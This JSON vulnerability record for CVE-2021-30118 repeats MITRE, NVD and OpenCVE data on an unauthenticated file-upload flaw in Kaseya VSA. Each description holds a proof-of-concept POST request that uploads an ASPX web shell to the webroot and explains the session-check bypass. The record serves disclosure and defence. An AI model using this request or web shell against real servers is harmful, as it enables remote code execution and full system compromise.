{
  "cve": "CVE-2021-30118",
  "mitre": {
    "cpes": [],
    "created": "2021-07-09T13:19:42+00:00",
    "description": "An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language=\"C#\" Debug=\"true\" validateRequest=\"false\" %> <%@ Import namespace=\"System.Web.UI.WebControls\" %> <%@ Import namespace=\"System.Diagnostics\" %> <%@ Import namespace=\"System.IO\" %> <%@ Import namespace=\"System\" %> <%@ Import namespace=\"System.Data\" %> <%@ Import namespace=\"System.Data.SqlClient\" %> <%@ Import namespace=\"System.Security.AccessControl\" %> <%@ Import namespace=\"System.Security.Principal\" %> <%@ Import namespace=\"System.Collections.Generic\" %> <%@ Import namespace=\"System.Collections\" %> <script runat=\"server\"> private const string password = \"pass\"; // The password ( pass ) private const string style = \"dark\"; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access * The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact --- This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.",
    "metrics": {
      "cvssV2_0": {},
      "cvssV3_0": {},
      "cvssV3_1": {
        "score": 9.8,
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
      },
      "cvssV4_0": {}
    },
    "mitre_repo_path": "cves/2021/30xxx/CVE-2021-30118.json",
    "references": [
      "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",
      "https://csirt.divd.nl/CVE-2021-30118",
      "https://csirt.divd.nl/DIVD-2021-00011",
      "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021"
    ],
    "title": "Unauthenticated Remote Code Execution in Kaseya VSA < v9.5.5",
    "updated": "2024-08-03T22:24:59.357000+00:00",
    "vendors": [],
    "weaknesses": []
  },
  "nvd": {
    "cpes": [
      "cpe:2.3:a:kaseya:vsa:*:*:*:*:-:*:*:*"
    ],
    "created": "2021-07-09T14:15:07.847000+00:00",
    "description": "An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language=\"C#\" Debug=\"true\" validateRequest=\"false\" %> <%@ Import namespace=\"System.Web.UI.WebControls\" %> <%@ Import namespace=\"System.Diagnostics\" %> <%@ Import namespace=\"System.IO\" %> <%@ Import namespace=\"System\" %> <%@ Import namespace=\"System.Data\" %> <%@ Import namespace=\"System.Data.SqlClient\" %> <%@ Import namespace=\"System.Security.AccessControl\" %> <%@ Import namespace=\"System.Security.Principal\" %> <%@ Import namespace=\"System.Collections.Generic\" %> <%@ Import namespace=\"System.Collections\" %> <script runat=\"server\"> private const string password = \"pass\"; // The password ( pass ) private const string style = \"dark\"; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access * The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact --- This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.",
    "metrics": {
      "cvssV2_0": {
        "score": 10.0,
        "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
      },
      "cvssV3_0": {},
      "cvssV3_1": {
        "score": 9.8,
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
      },
      "cvssV4_0": {}
    },
    "nvd_repo_path": "2021/CVE-2021-30118.json",
    "references": [
      "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",
      "https://csirt.divd.nl/CVE-2021-30118",
      "https://csirt.divd.nl/DIVD-2021-00011",
      "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021"
    ],
    "title": null,
    "updated": "2022-04-29T18:59:40.007000+00:00",
    "vendors": [
      "kaseya",
      "kaseya$PRODUCT$vsa"
    ],
    "weaknesses": [
      "CWE-434"
    ]
  },
  "opencve": {
    "changes": [],
    "cpes": {
      "data": [
        "cpe:2.3:a:kaseya:vsa:*:*:*:*:-:*:*:*"
      ],
      "providers": [
        "nvd"
      ]
    },
    "created": {
      "data": "2021-07-09T13:19:42+00:00",
      "provider": "mitre"
    },
    "description": {
      "data": "An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload leading to RCE. An attacker can upload files with the privilege of the Web Server process and subsequently use these files to execute asp commands. Detailed description --- Given the following request: ``` POST /SystemTab/uploader.aspx?Filename=shellz.aspx&PathData=C%3A%5CKaseya%5CWebPages%5C&__RequestValidationToken=ac1906a5-d511-47e3-8500-47cc4b0ec219&qqfile=shellz.aspx HTTP/1.1 Host: 192.168.1.194 Cookie: sessionId=92812726; %5F%5FRequestValidationToken=ac1906a5%2Dd511%2D47e3%2D8500%2D47cc4b0ec219 Content-Length: 12 <%@ Page Language=\"C#\" Debug=\"true\" validateRequest=\"false\" %> <%@ Import namespace=\"System.Web.UI.WebControls\" %> <%@ Import namespace=\"System.Diagnostics\" %> <%@ Import namespace=\"System.IO\" %> <%@ Import namespace=\"System\" %> <%@ Import namespace=\"System.Data\" %> <%@ Import namespace=\"System.Data.SqlClient\" %> <%@ Import namespace=\"System.Security.AccessControl\" %> <%@ Import namespace=\"System.Security.Principal\" %> <%@ Import namespace=\"System.Collections.Generic\" %> <%@ Import namespace=\"System.Collections\" %> <script runat=\"server\"> private const string password = \"pass\"; // The password ( pass ) private const string style = \"dark\"; // The style ( light / dark ) protected void Page_Load(object sender, EventArgs e) { //this.Remote(password); this.Login(password); this.Style(); this.ServerInfo(); <snip> ``` The attacker can control the name of the file written via the qqfile parameter and the location of the file written via the PathData parameter. Even though the call requires that a sessionId cookie is passed we have determined that the sessionId is not actually validated and any numeric value is accepted as valid. Security issues discovered --- * a sessionId cookie is required by /SystemTab/uploader.aspx, but is not actually validated, allowing an attacker to bypass authentication * /SystemTab/uploader.aspx allows an attacker to create a file with arbitrary content in any place the webserver has write access * The web server process has write access to the webroot where the attacker can execute it by requesting the URL of the newly created file. Impact --- This arbitrary file upload allows an attacker to place files of his own choosing on any location on the hard drive of the server the webserver process has access to, including (but not limited to) the webroot. If the attacker uploads files with code to the webroot (e.g. aspx code) he can then execute this code in the context of the webserver to breach either the integrity, confidentiality, or availability of the system or to steal credentials of other users. In other words, this can lead to a full system compromise.",
      "provider": "mitre"
    },
    "metrics": {
      "cvssV2_0": {
        "data": {
          "score": 10.0,
          "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
        },
        "provider": "nvd"
      },
      "cvssV3_0": {
        "data": {},
        "provider": null
      },
      "cvssV3_1": {
        "data": {
          "score": 9.8,
          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        },
        "provider": "mitre"
      },
      "cvssV4_0": {
        "data": {},
        "provider": null
      },
      "kev": {
        "data": {},
        "provider": null
      },
      "ssvc": {
        "data": {},
        "provider": null
      },
      "threat_severity": {
        "data": null,
        "provider": null
      }
    },
    "references": {
      "data": [
        "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",
        "https://csirt.divd.nl/CVE-2021-30118",
        "https://csirt.divd.nl/DIVD-2021-00011",
        "https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021"
      ],
      "providers": [
        "mitre",
        "nvd"
      ]
    },
    "title": {
      "data": "Unauthenticated Remote Code Execution in Kaseya VSA < v9.5.5",
      "provider": "mitre"
    },
    "updated": {
      "data": "2024-08-03T22:24:59.357000+00:00",
      "provider": "mitre"
    },
    "vendors": {
      "data": [
        "kaseya",
        "kaseya$PRODUCT$vsa"
      ],
      "providers": [
        "nvd"
      ]
    },
    "weaknesses": {
      "data": [
        "CWE-434"
      ],
      "providers": [
        "nvd"
      ]
    }
  }
}